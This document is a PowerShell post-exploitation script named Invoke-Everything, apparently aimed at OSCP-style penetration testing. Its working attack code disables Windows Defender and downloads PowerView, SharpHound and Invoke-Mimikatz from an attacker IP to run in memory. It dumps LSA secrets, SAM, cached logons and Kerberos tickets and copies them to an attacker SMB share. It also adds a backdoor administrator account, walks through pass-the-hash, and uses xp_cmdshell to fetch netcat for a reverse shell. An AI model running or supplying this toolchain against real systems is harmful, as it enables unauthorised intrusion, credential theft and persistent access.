function Invoke-Everything
{
<#
The following Script runs different powershell scripts in memory, this means they are not put on the local disk itself. Before running the script run an AMSI bypass to ensure scripts
will run properly. All Scripts are downloaded from your attacker machine IP address on Port 80, which means you will have to run a web server such as:

sudo python3 -m http.server 80

You will also need to ensure that the following scripts are in the same directory the web server is running:

PowerUp.ps1
PowerView.ps1
PowerView_Dev.ps1
PowerUpSQL.ps1
Invoke-Mimikatz.ps1
SharpHound.ps1

Output will be saved to invoke.txt

Start SMB Server on Attacker Machine to allow for the invoke.txt file to be moved back to you:

smbserver.py -smb2support share .

To run Script Invoke-Everything -attackerip <kali ip>

More information can be found here https://overgrowncarrot1.medium.com/invoke-everything-ps1-66734832598

#>
      [cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $AttackerIP
    )


    if ($AttackerIP)
    {
      write-host -foregroundcolor yellow -backgroundcolor black "`n[*] The following tools are needed PowerUp.ps1, PowerView.ps1,PowerView_Dev.ps1, PowerUpSQL.ps1, Invoke-Mimikatz.ps1 and SharpHound.ps1"
      write-host -foregroundcolor yellow -backgroundcolor black "`n[*] The tools must be named just as they are above"
      write-host -foregroundcolor yellow -backgroundcolor black "`n[*] Make sure to start smbserver on $AttackerIP with command smbserver.py -smb2support share ."
      write-host -foregroundcolor yellow -backgroundcolor black "`n[*] SMB Server will allow for file invoke.txt to be sent back to $AttackerIP"

      $confirmation = Read-Host "Do you have the following tools ready in a web server on $AttackerIP machine and have an smbserver running on $AttackerIP? (Y/N):"
        if ($confirmation -eq 'Y')
          {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*] Continuing Script"
          }
        else {
          write-host -foregroundcolor yellow -backgroundcolor black "`n[*] Need to have running to continue script"
        }


        write-host -foregroundcolor yellow -backgroundcolor black "`n[*] The following script may take a few minutes to run, if getting errors that is ok, let the script continue"
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to Disable Real Time Monitoring"
  
        Set-MpPreference -DisableRealtimeMonitoring $true
        Set-MpPreference -DisableIOAVProtection $true
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running arp and ipconfig"
        arp -a > invoke.txt; ipconfig /all >> invoke.txt; `    
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*] Running whoami, whoami /priv and whoami /groups"
        
        whoami >> invoke.txt; whoami /priv >> invoke.txt; whoami /groups >> invoke.txt; `
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running systeminfo"
        systeminfo >> invoke.txt; `

        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running Service"
        service >> invoke.txt `
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running PowerUp with Invoke-AllChecks"
        Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/PowerUp.ps1"); invoke-allchecks >> invoke.txt; `
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running PowerView with get-netdomaincontoller, get-netuser, logged on users, preauthnotrequired, delegation "
        Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/PowerView_Dev.ps1"); Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/PowerView.ps1"); get-netdomaincontroller >> invoke.txt; get-netuser >> invoke.txt; get-netuser -spn >> invoke.txt; `
        get-netloggedon >> .\Invoke.txt; get-loggedonlocal >> .\Invoke.txt; get-lastloggedon >> .\Invoke.txt; get-netcomputer >> invoke.txt; get-netou >> invoke.txt; get-netgpo >> invoke.txt `
            
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Attempting to find any MSSQL Instances, and writing them to sql.txt"
  
        Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/PowerUpSQL.ps1"); Get-SQLInstanceLocal -Verbose > sql.txt; `
        Get-SQLInstanceDomain -Verbose >> sql.txt; Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> sql.txt; Get-SQLInstanceDomain |  Get-SQLServerInfo >> sql.txt
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Attempting to run SharpHound.ps1 Kali Bloodhound may NOT work with sharphound, ensure you have version 3.0.5 to run properly (can download for Windows if need be) Remember you will also need Neo4j"
  
        Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/SharpHound.ps1"); Invoke-BloodHound -collectionmethod All
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Attempting to copy Invoke.txt to SMB Share at Attacker IP"
        cp invoke.txt \\$AttackerIP\share 
  
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Attempting to copy BloodHound Zip to SMB Share at Attacker IP"
  
        cp *.zip \\$AttackerIP\share
        cp *.bin \\$AttackerIP\share

    }
    else
    {
    'Need an IP address'
    }

write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Attempting to see if current user is Administrator, if so running Invoke-Mimikatz"

function Check-IsElevated
    {
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$p = New-Object System.Security.Principal.WindowsPrincipal($id)
if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))
  {Write-Output $True}

else
  
  {Write-Output $False}
    }
  if(-not(Check-IsElevated))

    {Throw "Not an Administrator will not run Invoke-Mimikatz"}

else

  {

    Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "lsadump::lsa /patch" "lsadump::trust /patch" "vault::cred" "vault::cred /patch" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "sekurlsa::logonpasswords" "sekurlsa::ekeys" "sekurlsa::dpapi"' > mimi.txt

      write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Wrote Invoke-Mimikatz to mimi.txt"
      write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Attempting to copy mimi.txt to SMB share at Attacker IP"

      cp mimi.txt \\$AttackerIP\share
      
      write-host -foregroundcolor green -backgroundcolor black "`n`n[*] Attempting to create presistence with username adm1n and password P@ssw0rd1"
      
      net user adm1n P@ssw0rd1 /add; net localgroup "Administrators" /add adm1n; net localgroup "Remote Desktop Users" /add adm1n; net localgroup "Remote Management Users" /add adm1n; get-netuser adm1n >> invoke.txt
      
      write-host -foregroundcolor green -backgroundcolor black "`n`n[*] THE FOLLOWING COMMANDS MAY BE DANGEROUS TO RUN, EACH COMMAND WILL ASK FOR USER INPUT WOULD YOU LIKE TO RUN THE COMMANDS"

$confirmation = Read-Host "Are you sure you want to Proceed, this command will run vault::cred /patch and kerberos::list /export then zip the .kirbi files (Y/N):"
if ($confirmation -eq 'y') 
  {
      write-host -foregroundcolor green -backgroundcolor black "`n`n[*] You have confirmed to continue"

      Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -command '"vault::cred /patch" "kerberos::list /export"'; `
      Compress-Archive -Force *.kirbi kirbi.zip; del *.kirbi; cp kirbi.zip //$AttackerIP/share; `
      
  }
else 
  {
    write-host 'Cancelled'
  }

$confirmation = Read-Host "Are you sure you want to Proceed, this command will run crypto::certificates /systemstore:local_machine EXTREMELY DANGEROUS!!! (Y/N):"
if ($confirmation -eq 'y') 
  {

  write-host -foregroundcolor green -backgroundcolor black "`n`n[*] You have confirmed to continue"

  Invoke-Expression (New-Object Net.Webclient).DownloadString("http://$AttackerIP/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -command '"crypto::certificates /systemstore:local_machine"'

  }
else 
  {
  write-host 'Cancelled'
  }

  write-host -foregroundcolor green -backgroundcolor black "`n`n[*] Thanks for using Invoke-Everything, the next section may NOT be allowed for OSCP"

      $confirmation = Read-Host "Do you have a username, domain name and NTLM hash and would you like to try to Pass the Hash(Y/N)?:"
      if ($confirmation -eq 'y')
    {
    
      $User = Read-Host -Prompt 'Input Username'
      $Domain = Read-Host -Prompt 'Input Domain Name'
      $NTLM = Read-Host -Prompt 'Input NTLM Hash'
      write-host -foregroundcolor yellow -backgroundcolor black "Input the following command after putting Invoke-Mimikatz into memory with command iex (iwr -usebasicparsing http://$AttackerIP/Invoke-Mimikatz.ps1)"
      write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NTLM /run:powershell.exe""'"
      
    }
  else
    {
      write-host 'Cancelled'
    }
    $confirmation = Read-Host "Do you want to try and attack a SQL Server(Y/N)?:"
      if ($confirmation -eq 'y')
    {
      $MSSQL = Read-Host -Prompt 'Input MSSQL Server Instance Name'
      Get-SQLServerLinkCrawl -instance $MSSQL -query "exec master..xp_cmdshell 'whoami'"
    }
    else
    {
      write-host 'Cancelled'
    }
    $confirmation = Read-Host "Do you want to try a Reverse Shell on the SQL Server(Y/N)?:"
      if ($confirmation -eq 'y')
    {
      $MSSQL = Read-Host -Prompt 'Input MSSQL Server Instance Name'
      Get-SQLServerLinkCrawl -instance $MSSQL -query "exec master..xp_cmdshell 'wget http://$AttackerIP/nc64.exe -outfile C:\Windows\Temp\nc64.exe'"; `
      cd C:\Windows\Temp;. .\nc64.exe -e cmd $AttackerIP 4444
    }
    else
    {
      write-host -foregroundcolor green -backgroundcolor black 'That is all, thanks for using the script'
    }
  }
}

